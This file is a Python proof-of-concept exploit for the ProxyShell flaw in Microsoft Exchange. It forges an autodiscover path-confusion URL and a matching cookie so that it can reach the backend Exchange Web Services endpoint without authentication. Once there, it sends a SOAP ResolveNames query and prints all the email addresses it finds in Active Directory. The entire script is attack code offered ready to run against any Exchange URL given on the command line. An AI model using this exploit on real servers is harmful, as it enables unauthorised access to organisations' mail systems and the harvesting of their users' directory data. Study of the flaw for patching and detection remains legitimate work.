#!/usr/bin/env python3
#
# https://github.com/dmaasland/proxyshell-poc

import argparse
import random
import string
import requests
import sys
import xml.etree.ElementTree as ET


class ProxyShell:

    def __init__(self, exchange_url, verify=False):

        self.exchange_url = exchange_url if exchange_url.startswith(
            'https://') else f'https://{exchange_url}'
        self.rand_email = f'{rand_string()}@{rand_string()}.{rand_string(3)}'

        self.session = requests.Session()
        self.session.verify = verify
        self.session.headers = {
            'Cookie': f'Email=autodiscover/autodiscover.json?a={self.rand_email}'
        }

    def post(self, endpoint, data, headers={}):

        url = f'{self.exchange_url}/autodiscover/autodiscover.json?a={self.rand_email}{endpoint}'
        r = self.session.post(
            url=url,
            data=data,
            headers=headers
        )
        return r


def rand_string(n=5):

    return ''.join(random.choices(string.ascii_lowercase, k=n))


def get_args():

    parser = argparse.ArgumentParser(description='ProxyShell example')
    parser.add_argument('-u', help='Exchange URL', required=True)
    return parser.parse_args()


def get_emails(proxyshell):

    data = '''
        <soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
  </soap:Header>
 <soap:Body>
    <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
      <m:UnresolvedEntry>SMTP:</m:UnresolvedEntry>
    </m:ResolveNames>
  </soap:Body>

</soap:Envelope>
    '''

    headers = {
        'Content-Type': 'text/xml'
    }

    r = proxyshell.post(
        f'/EWS/exchange.asmx',
        data=data,
        headers=headers
    )

    email_xml = ET.fromstring(r.content)
    emails = email_xml.findall(
        '{*}Body/{*}ResolveNamesResponse/{*}ResponseMessages/{*}ResolveNamesResponseMessage/{*}ResolutionSet/{*}Resolution/{*}Mailbox/{*}EmailAddress'
    )

    for email in emails:
        print(f'Found address: {email.text}')


def main():
    args = get_args()
    exchange_url = args.u

    proxyshell = ProxyShell(
        exchange_url
    )

    get_emails(proxyshell)


if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning
    )
    if not (sys.version_info.major == 3 and sys.version_info.minor >= 8):
        print("This script requires Python 3.8 or higher!")
        print("You are using Python {}.{}.".format(
            sys.version_info.major, sys.version_info.minor))
        sys.exit(1)
    main()
